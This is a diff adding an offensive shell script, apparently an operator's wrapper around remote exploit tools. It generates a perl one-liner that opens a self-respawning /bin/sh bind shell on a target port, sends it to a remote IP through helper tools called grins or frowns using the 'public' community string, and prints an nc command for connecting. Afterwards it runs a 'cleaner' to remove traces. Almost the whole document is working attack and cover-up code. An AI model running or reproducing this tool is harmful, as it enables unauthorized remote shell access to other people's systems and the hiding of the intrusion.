@@ -1,0 +1,185 @@
+#!/bin/sh
+VER=2.4
+##########################################################
+### Generate & run the following script:
+### 	- script to start (via perl) a /bin/sh listener
+### 	- run grins/frowns/whatever using the above script
+###     - which dies after $BURNAT secs.
+##########################################################
+COLOR_SUCCESS="\\033[1;32m"
+COLOR_FAILURE="\\033[1;31m"
+COLOR_WARNING="\\033[1;33m"
+COLOR_NORMAL="\\033[0;39m"
+COLOR_NOTE="\\033[0;34m"
+SETCOLOR_SUCCESS="echo -en $COLOR_SUCCESS"
+SETCOLOR_FAILURE="echo -en $COLOR_FAILURE"
+SETCOLOR_WARNING="echo -en $COLOR_WARNING"
+SETCOLOR_NORMAL="echo -en $COLOR_NORMAL"
+SETCOLOR_NOTE="echo -en $COLOR_NOTE"
+$SETCOLOR_NOTE
+echo "CommandLine: ${0} ${*}"
+$SETCOLOR_NORMAL
+echo ""
+
+# Some default values
+SCRIPT="/tmp/.t"
+DIR="/tmp/.X11R6"
+DEFBURNAT=6000
+BURNATORIG=
+GS_OPTION=frowns
+RUN_AS=/bin/sh
+
+LOCAL_IP_GUESS=`ifconfig -a | egrep "encap|inet" | egrep -vi "grep|127\.0\.0\.1|loopback"`
+
+# Show usage and exit
+usage() {
+    PROG=`basename $0 2>/dev/null`
+    cat <<EOF
+$PROG v.$VER
+ 
+This version of GS uses perl on the target to start a listener on a TCP
+port on target. The listener will self destruct in -t# seconds, which
+defaults to ${DEFBURNAT}s. Up until that time, it will start a fresh
+listener each time the previous session terminates. Killing the TWO
+perl processes on target will stop that behavior, as will letting the
+time expire. 
+
+-s option: Default, /bin/sh, calls system("/bin/sh") with STDIN/STDOUT sent
+via TCP. Using the -s system option will run each line sent remotely
+via its own system() command, in case /bin/sh is not there or no good. 
+If using -s system, killing the two perl processes will end your TCP session.
+
+Usage: ${0} [options]
+  -i <remoteIP>                (required)
+  -g <grins|frowns|sneer>      def= $GS_OPTION
+  -s <system|/bin/sh>          def= /bin/sh
+  -p <bindPort>                def= random
+  -t <burnTime>                def= $DEFBURNAT
+
+$PROG v.$VER
+EOF
+    exit 1
+}
+
+#
+# Process args
+#
+    RATENVS=""
+    RATARGS=""
+#    while getopts g:i:n:f:c:l:D:S:s:A:E: op; do
+    while getopts g:i:s:p:t: op; do
+	case $op in
+	g)  GS_OPTION="$OPTARG";;
+	i)  REMOTE_IP="$OPTARG";;
+	s)  ORIG_RUN_AS="$OPTARG"
+	    RUN_AS=`echo $OPTARG | egrep "/bin/sh|system"`
+          ;;
+	p)  BINDPORT="$OPTARG";;
+	t)  BURNATORIG="$OPTARG"
+          BURNAT=`echo $OPTARG | tr -dc "0-9"`;;
+	esac
+    done
+    cmdFlag="-c"
+    shift `expr $OPTIND - 1`
+
+    # Defaults:
+    [ "${BINDPORT}" ] ||  BINDPORT=`mkrandom -n 2>/dev/null`
+    [ -z "$BURNAT$BURNATORIG" ] && BURNAT=$DEFBURNAT
+
+    # Check for required args
+    [ -z "$BURNAT" ] && echo "Error: malformed burn time -t $BURNATORIG" && usage
+    [ -z "$BINDPORT" ] && echo "Error: missing bind Port option -p" && usage
+    [ -z "$REMOTE_IP" ] && echo "Error: missing remote IP" && usage
+    [ -z "$RUN_AS" ] && echo "Error: invalid -s \"$ORIG_RUN_AS\" option" && usage
+
+
+#following line is now unused
+EXTRA="${*}"
+
+echo "Generating oneshot upload script." 
+RUN_WHAT="system \"/bin/sh\""
+if [ "$RUN_AS" = "system" ] ; then
+  RUN_WHAT="system\$_ while<>"
+fi
+
+cat > oneshot.scr << EOF
+/sbin/sh -c (perl -MIO -e 'if (\$k=fork){\$i=$BURNAT;while(\$i--){sleep 1};kill(9,\$k);exit}chdir("/tmp");while(\$c=new IO::Socket::INET(LocalPort,$BINDPORT,Reuse,1,Listen)->accept){\$~->fdopen(\$c,w);STDIN->fdopen(\$c,r);STDERR->fdopen(\$c,w);$RUN_WHAT}')&
+EOF
+
+CHARS=`wc -c oneshot.scr  |awk '{print $1}'`
+[ "$CHARS" ] || CHARS=0
+
+CHARSLEFT=$((254-CHARS))
+
+echo "oneshot script is as follows (\$ and \" shown here as \\\$ and \\\","
+echo "but not sent that way), $CHARS chars, $CHARSLEFT remaining: "
+echo "========"
+cat oneshot.scr | sed "s/\"/\\\\\\\"/g" | sed "s/\\$/\\\\$/g"
+echo "========"
+echo ""
+
+if [ ! -f "oneshot.scr" -o ${CHARS} -ge 254 -o ${CHARS} -le 0 ]; then
+  echo "FATAL ERROR: oneshot.scr is either not there or too large"
+  exit 1
+fi 
+
+echo -e "About to run:  $COLOR_NOTE\n\n"
+echo -e "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public \n\n"
+
+$SETCOLOR_FAILURE
+echo -en "LISTENer will be started on port $BINDPORT.
+
+(Hit return when you've got a rat listener started)$COLOR_NORMAL"
+read input
+
+
+echo `date` "now running:  "
+echo "  ./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public "
+./${GS_OPTION} ${REMOTE_IP} ./oneshot.scr public
+
+echo -e `date` "$COLOR_NOTE\n\nOnce the remote shell fires on $BINDPORT, you will be able to connect to it with:\n\nnc $REMOTE_IP $BINDPORT
+$COLOR_NORMAL\n"
+
+echo -e "${COLOR_NOTE}Your clean up while on via this shell: 
+        -  kill only your two \"perl -MIO\" processes
+        -  your shell, if you have one, will survive those kills$COLOR_NORMAL
+
+ps -ef | grep perl..MIO
+ps -ef | grep -v grep | grep perl..MIO | sed \"s/.*root *//g\" | sed \"s/ .*//g\"
+kill  
+
+$COLOR_FAILURE
+FAILURE MODE: If this executes remotely but you cannot connect to it,
+              it will self destruct in $BURNAT seconds.
+$COLOR_NORMAL"
+
+
+
+if [ "$GS_OPTION" = "frowns" ] ; then
+  $SETCOLOR_NOTE
+  echo -e "OK, ./frowns has finished.\n"
+  echo -e "\ngs.os.gr is going to run cleaner for you now, unless you (A)bort...\n"
+  $SETCOLOR_FAILURE
+  echo -e "./cleaner $REMOTE_IP public snmpx\n"
+  $SETCOLOR_NOTE
+  echo -en "Press return to run cleaner as shown, or enter \"A\" to abort."
+  $SETCOLOR_NORMAL
+  read ans
+  ABORT=`echo $ans | tr "a-z" "A-Z"`
+  if [ "${ABORT:0:1}" = "A" ] ; then
+    $SETCOLOR_FAILURE
+    echo -e "\n\n\aWHAT!!  Ok, then. You need to clean up after your own mess.\n\n"
+    $SETCOLOR_NORMAL
+  else
+    ./cleaner $REMOTE_IP public snmpx
+  fi
+fi
+
+echo -e "$COLOR_NOTE\n\nThank you for playing$COLOR_NORMAL\n\n"
+
+### echo "removing intermediate scripts"
+### rm ./gr_upload.scr ./oneshot.scr ./gr_upload.uu 
+
+echo
+echo "Don't forget to look for stray crap running on target."
+echo -e "\n\nDone.\n\n"
